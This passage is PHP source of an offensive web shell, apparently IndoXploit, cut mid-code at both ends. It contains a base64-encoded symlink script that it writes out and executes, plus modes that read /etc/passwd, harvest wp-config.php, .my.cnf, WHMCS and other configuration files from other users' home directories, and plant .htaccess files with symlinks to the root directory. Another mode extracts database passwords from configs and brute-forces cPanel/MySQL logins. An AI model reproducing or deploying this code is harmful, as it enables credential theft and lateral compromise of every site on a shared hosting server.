L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
    $file = "anu/vhost.cin";
    $handle = fopen($file ,"w+");
    fwrite($handle ,base64_decode($vhost));
    fclose($handle);
    chmod($file, 0755);
    if(exe("cd anu && ./vhost.cin")) {
      echo "<center><a href='$link_config/anu'><font color=lime>Done</font></a></center>";
    } else {
      echo "<center><a href='$link_config/anu/vhost.cin'><font color=lime>Done</font></a></center>";
    }

  } else {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    while($passwd = fgets($etc)) {
      if($passwd == "" || !$etc) {
        echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach($user_config[1] as $user_idx) {
          $user_config_dir = "/home/$user_idx/public_html/";
          if(is_readable($user_config_dir)) {
            $grab_config = array(
              "/home/$user_idx/.my.cnf" => "cpanel",
              "/home/$user_idx/.accesshash" => "WHM-accesshash",
              "$user_config_dir/po-content/config.php" => "Popoji",
              "$user_config_dir/vdo_config.php" => "Voodoo",
              "$user_config_dir/bw-configs/config.ini" => "BosWeb",
              "$user_config_dir/config/koneksi.php" => "Lokomedia",
              "$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
              "$user_config_dir/clientarea/configuration.php" => "WHMCS",
              "$user_config_dir/whm/configuration.php" => "WHMCS",
              "$user_config_dir/whmcs/configuration.php" => "WHMCS",
              "$user_config_dir/forum/config.php" => "phpBB",
              "$user_config_dir/sites/default/settings.php" => "Drupal",
              "$user_config_dir/config/settings.inc.php" => "PrestaShop",
              "$user_config_dir/app/etc/local.xml" => "Magento",
              "$user_config_dir/joomla/configuration.php" => "Joomla",
              "$user_config_dir/configuration.php" => "Joomla",
              "$user_config_dir/wp/wp-config.php" => "WordPress",
              "$user_config_dir/blog/wp-config.php" => "WordPress",
              "$user_config_dir/wordpress/wp-config.php" => "WordPress",
              "$user_config_dir/wp-config.php" => "WordPress",
              "/home/$user_idx/blog/wp-config.php" => "WordPress",              
              "/home/$user_idx/wp/wp-config.php" => "WordPress",              
              "/home/$user_idx/wordpress/wp-config.php" => "WordPress",              
              "/home/$user_idx/wp-config.php" => "WordPress",              
              "$user_config_dir/admin/config.php" => "OpenCart",
              "$user_config_dir/slconfig.php" => "Sitelok",
              "$user_config_dir/application/config/database.php" => "Ellislab");
            foreach($grab_config as $config => $nama_config) {
              $ambil_config = file_get_contents($config);
              if($ambil_config == '') {
              } else {
                $file_config = fopen("anu/$user_idx-$nama_config.txt","w");
                fputs($file_config,$ambil_config);
              }
            }
          }   
        }
      } 
    }
  echo "<center><a href='?dir=$dir/anu'><font color=lime>Done</font></a></center>";
  }
} elseif($_GET['do'] == 'jumping') {
   $i = 0;
   $etc = fopen("/etc/passwd", "r");
   while($passwd = fgets($etc)) {
      if($passwd == '' || !$etc) {
         echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
         preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
         foreach($user_jumping[1] as $user_idx_jump) {
            $potent_dir = array("", "public_html", "backupwordpress", "scriptupdate", "backups", "backup", "www", "fantastico_backups");
            foreach ($potent_dir as $p_dir) {
            $user_jumping_dir = "/home/$user_idx_jump/$p_dir";
            if(is_readable($user_jumping_dir)) {
               $i++;
               echo "<a style='color: cyan;' href='?dir=/home/$user_idx_jump/$p_dir'>/home/$user_idx_jump/$p_dir<br /></a>";
               if(is_writable($user_jumping_dir)) {
                 echo "<a style='color: cyan;' href='?dir=/home/$user_idx_jump/$p_dir'>/home/$user_idx_jump/$p_dir<br /></a>";
               }
 }
}
 }
}
}
        if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
} elseif($_GET['do'] == 'jumpingv2') {
  $i = 0;
  echo "<div class='margin: 5px auto;'>";
  if(preg_match("/hsphere/", $dir)) {
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])) {
      echo "<pre>";
      foreach($urls as $url) {
        $url = str_replace(array("http://","www."), "", strtolower($url));
        $etc = "/etc/passwd";
        $f = fopen($etc,"r");
        while($gets = fgets($f)) {
          $pecah = explode(":", $gets);
          $user = $pecah[0];
          $dir_user = "/hsphere/local/home/$user";
          if(is_dir($dir_user) === true) {
            $url_user = $dir_user."/".$url;
            if(is_readable($url_user)) {
              $i++;
              $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
              if(is_writable($url_user)) {
                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
              }
              echo $jrw."<br>";
            }
          }
        }
      }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
    } else {
      echo '<center>
          <form method="post">
          List Domains: <br>
          <textarea name="url" style="width: 500px; height: 250px;">';
      $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
      while($getss = fgets($fp)) {
        echo $getss;
      }
      echo  '</textarea><br>
          <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
          </form></center>';
    }
  } elseif(preg_match("/vhosts|vhost/", $dir)) {
    preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])) {
      echo "<pre>";
      foreach($urls as $url) {
        $url = str_replace("www.", "", $url);
        $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
        if(is_dir($web_vh) === true) {
          if(is_readable($web_vh)) {
            $i++;
            $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
            if(is_writable($web_vh)) {
              $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
            }
            echo $jrw."<br>";
          }
        }
      }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
    } else {
      echo '<center>
          <form method="post">
          List Domains: <br>
          <textarea name="url" style="width: 500px; height: 250px;">';
          bing("ip:$ip");
      echo  '</textarea><br>
          <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
          </form></center>';
    }
  } else {
    echo "<pre>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
    while($passwd = fgets($etc)) {
      if($passwd == '' || !$etc) {
        echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
        preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
        foreach($user_jumping[1] as $user_idx_jump) {
          $user_jumping_dir = "/home/$user_idx_jump/public_html";
          if(is_readable($user_jumping_dir)) {
            $i++;
            $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)) {
              $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
              $domain_jump = file_get_contents("/etc/named.conf");  
              if($domain_jump == '') {
                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
              } else {
                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                foreach($domains_jump[1] as $dj) {
                  $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                  $user_jumping_url = $user_jumping_url['name'];
                  if($user_jumping_url == $user_idx_jump) {
                    echo " => ( <u>$dj</u> )<br>";
                    break;
                  }
                }
              }
            } else {
              echo "<br>";
            }
          }
        }
      }
    }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
  }
  echo "</div>";  } elseif($_GET['do'] == 'sym404') {  
      echo '<center><form method="post"><br>File Target : </br>
      <input name="fl1" value="configuration.php"><input name="anu1" type="submit" value="SYM"><br>
      </br>
      <input name="fl2" value="wp-config.php"><input name="anu2" type="submit" value="SYM"></form><br>';
    if($_POST['anu1']){
    rmdir("sl");
    exe("mkdir sl");
    exe('echo "ReadmeName x.txt">sl/.htaccess');
    exe("ln -s ".$_POST['fl1']." sl/x.txt");
      echo'<a href=?dir='.$dir.'/sl target="_blank">Here</a>';
    }
    if($_POST['anu2']){
    rmdir("sl");
    exe("mkdir sl");
    exe('echo "ReadmeName x.txt">sl/.htaccess');
    exe("ln -s ".$_POST['fl2']." sl/x.txt");
      echo'<a href=sl target="_blank">Here</a>';
    }
  } elseif($_GET['do'] == 'cpanel') {
  if($_POST['crack']) {
    $usercp = explode("\r\n", $_POST['user_cp']);
    $passcp = explode("\r\n", $_POST['pass_cp']);
    $i = 0;
    foreach($usercp as $ucp) {
      foreach($passcp as $pcp) {
        if(@mysql_connect('localhost', $ucp, $pcp)) {
          if($_SESSION[$ucp] && $_SESSION[$pcp]) {
          } else {
            $_SESSION[$ucp] = "1";
            $_SESSION[$pcp] = "1";
            if($ucp == '' || $pcp == '') {
              
            } else {
              $i++;
              if(function_exists('posix_getpwuid')) {
                $domain_cp = file_get_contents("/etc/named.conf");  
                if($domain_cp == '') {
                  $dom =  "";
                } else {
                  preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                  foreach($domains_cp[1] as $dj) {
                    $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                    $user_cp_url = $user_cp_url['name'];
                    if($user_cp_url == $ucp) {
                      $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                      break;
                    }
                  }
                }
              } else {
                $dom = "<font color=red>function is Disable by system</font>";
              }
              echo "$dom | <font color=lime>$ucp</font> | <font color=lime>$pcp</font><br>";
            }
          }
        }
      }
    }
    if($i == 0) {
    } else {
      echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
    }
  } else {
    echo "<center>
    <form method='post'>
    USER: <br>
    <textarea style='width: 450px; height: 150px;' name='user_cp'>";
    $_usercp = fopen("/etc/passwd","r");
    while($getu = fgets($_usercp)) {
      if($getu == '' || !$_usercp) {
        echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
        preg_match_all("/(.*?):x:/", $getu, $u);
        foreach($u[1] as $user_cp) {
            if(is_dir("/home/$user_cp/public_html")) {
              echo "$user_cp\n";
          }
        }
      }
    }
    echo "</textarea><br>
    PASS: <br>
    <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
    function cp_pass($dir) {
      $pass = "";
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        if(!is_file("$dir/$dirb")) continue;
        $ambil = file_get_contents("$dir/$dirb");
        if(preg_match("/WordPress/", $ambil)) {
          $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
        } elseif(preg_match("/JConfig|joomla/", $ambil)) {
          $pass .= ambilkata($ambil,"password = '","'")."\n";
        } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
          $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
        } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
          $pass .= ambilkata($ambil,'password = "','"')."\n";
        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
          $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
        } elseif(preg_match("/^[client]$/", $ambil)) {
          preg_match("/password=(.*?)/", $ambil, $pass1);
          if(preg_match('/"/', $pass1[1])) {
            $pass1[1] = str_replace('"', "", $pass1[1]);
            $pass .= $pass1[1]."\n";
          } else {
            $pass .= $pass1[1]."\n";
          }
        } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
          $pass .= ambilkata($ambil,"db_password = '","'")."\n";
        }
      }
      echo $pass;
    }
    $cp_pass = cp_pass($dir);
    echo $cp_pass;
    echo "</textarea><br>
    <input type='submit' name='crack' style='width: 450px;' value='Crack'>
    </form>
    <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
  }
  } elseif($_GET['do'] == 'sym') { 
    $d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("symlink",0777);
@chdir("symlink");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Et04.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=".validUrl($domains[1][0])."/><font class=txt>".validUrl($domains[1][0])."</font></a></td>
<td>".$user['name']."</td>
<td><a href='symlink/root/home/".$user['name']."/www' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("symlink",0777);
@chdir("symlink");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Et04.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("symlink",0777);@chdir("symlink");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex Et04.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
